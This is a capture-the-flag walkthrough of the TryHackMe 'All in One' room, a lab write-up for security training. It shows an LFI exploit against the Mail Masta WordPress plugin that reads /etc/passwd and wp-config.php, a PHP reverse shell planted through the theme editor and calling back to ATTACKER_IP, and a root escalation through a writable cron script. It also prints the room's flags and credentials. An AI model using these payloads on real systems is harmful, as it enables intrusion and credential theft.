# TryHackMe — All in One

## Overview

| Field        | Details                                      |
|-------------|----------------------------------------------|
| Platform    | TryHackMe                                    |
| Room        | All in One                                   |
| Difficulty  | Easy                                         |
| OS          | Linux (Ubuntu)                               |
| Techniques  | Vigenère Cipher, LFI, WordPress RCE, Cron Privesc |
| Author      | i7md                                         |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap_scan.txt 10.145.162.57
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Three services: FTP with anonymous access, SSH, and Apache web server.

### Directory Enumeration

```bash
gobuster dir -u http://10.145.162.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/wordpress       (Status: 301) → http://10.145.162.57/wordpress/
/hackathons      (Status: 200)
/server-status   (Status: 403)
```

### Inspecting /hackathons

```bash
curl http://10.145.162.57/hackathons
```

```html
<h1>Damn how much I hate the smell of <i>Vinegar</i> :/ !!!</h1>
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

Key findings in the HTML source:
- The word **Vinegar** — a phonetic hint for the **Vigenère cipher**
- `Dvc W@iyur@123` — ciphertext
- `KeepGoing` — the decryption key

---

## Cryptography — Vigenère Decryption

Decrypting the ciphertext using the key `KeepGoing` (only alphabetic characters are affected, special characters remain unchanged):

```bash
python3 -c "
ct = 'Dvc W@iyur@123'
key = 'KeepGoing'
result = ''
ki = 0
for c in ct:
    if c.isalpha():
        shift = ord(key[ki % len(key)].upper()) - 65
        base = 65 if c.isupper() else 97
        result += chr((ord(c) - base - shift) % 26 + base)
        ki += 1
    else:
        result += c
print(result)
"
```

**Result:** `Try H@ckme@123`

This gives us the password: **`H@ckme@123`**

---

## Web — WordPress Enumeration

### User Enumeration

```bash
curl -s http://10.145.162.57/wordpress/?author=1 -L | grep -i title
```

```
<title>elyana – All in One</title>
```

**WordPress credentials:** `elyana` : `H@ckme@123`

### Plugin Discovery

Inspecting the page source reveals two installed plugins:
- **Mail Masta** — known vulnerable plugin (LFI)
- **Reflex Gallery**

---

## Exploitation Path 1 — LFI via Mail Masta

The Mail Masta plugin contains a Local File Inclusion vulnerability in `count_of_send.php` where user input is passed directly to `include()` without any sanitization.

### Reading /etc/passwd

```bash
curl "http://10.145.162.57/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

This confirms the LFI and reveals the system user `elyana` (UID 1000).

### Reading wp-config.php via PHP Filter

Since PHP files are executed (not displayed) through `include()`, we use a PHP filter wrapper to base64-encode the source before inclusion:

```bash
curl "http://10.145.162.57/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d
```

**Extracted credentials:**
```
DB_USER: elyana
DB_PASSWORD: H@ckme@123
```

---

## Exploitation Path 2 — WordPress RCE (Theme Editor)

### Logging into WordPress

Navigate to `http://10.145.162.57/wordpress/wp-login.php` and log in with `elyana` : `H@ckme@123`.

### Injecting a Reverse Shell

1. Go to **Appearance → Theme Editor**
2. Select the **Twenty Twenty** theme
3. Edit **404.php**
4. Replace the contents with a PHP reverse shell:

```php
<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', array(
    0 => $sock,
    1 => $sock,
    2 => $sock
), $pipes);
?>
```

5. Start a listener: `nc -lvnp 4444`
6. Trigger the shell: `curl http://10.145.162.57/wordpress/wp-content/themes/twentytwenty/404.php`

**Result:** Shell as `www-data`.

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement — www-data → elyana

### Finding Hidden Credentials

```bash
find / -user elyana -readable 2>/dev/null
```

This reveals an unusual file: `/etc/mysql/conf.d/private.txt`

```bash
cat /etc/mysql/conf.d/private.txt
```

```
user: elyana
password: E@syR18ght
```

### Switching User

```bash
su elyana
# Password: E@syR18ght
```

### User Flag

```bash
cat ~/user.txt | base64 -d
```

**User Flag:** `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`

---

## Privilege Escalation — elyana → root

### Writable Cron Job

Inspecting the system crontab:

```bash
cat /etc/crontab
```

```
*  *    * * *   root    /var/backups/script.sh
```

A script runs **every minute as root**. Checking its permissions:

```bash
ls -la /var/backups/script.sh
```

```
-rwxrwxrwx 1 root root 73 Oct  7  2020 /var/backups/script.sh
```

The script is **world-writable** (777) — anyone can modify it.

### Exploiting the Cron Job

```bash
echo '#!/bin/bash' > /var/backups/script.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/backups/script.sh
```

Wait ~60 seconds for the cron to execute, then:

```bash
/tmp/rootbash -p
```

**Result:** Root shell.

### Root Flag

```bash
cat /root/root.txt | base64 -d
```

**Root Flag:** `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`

---

## Attack Path Summary

```
Reconnaissance (nmap, gobuster)
        │
        ├── /hackathons → Vigenère cipher → password: H@ckme@123
        │
        ├── WordPress user enum → elyana
        │
        ├─── Path A: LFI (Mail Masta) → php://filter → wp-config.php
        │
        └─── Path B: WP Admin → Theme Editor → PHP reverse shell
                        │
                        └── www-data shell
                                │
                                ├── /etc/mysql/conf.d/private.txt → E@syR18ght
                                │
                                └── su elyana → user.txt
                                        │
                                        └── Writable cron script (/var/backups/script.sh)
                                                │
                                                └── SUID bash → root → root.txt
```

---

## Key Takeaways

- **Vigenère cipher** is frequently hinted at with the word "Vinegar" in CTF challenges
- **LFI + php://filter** is essential for reading PHP source files through `include()` — without the filter, PHP files execute silently instead of displaying their contents
- **Mail Masta** is a textbook example of insecure coding: raw user input in `include()` with zero validation
- **World-writable cron scripts** running as root are an instant privilege escalation — always check `/etc/crontab` and file permissions
- **Credentials reuse** and credentials hidden in non-standard locations (`/etc/mysql/conf.d/`) are common CTF patterns that also reflect real-world misconfigurations
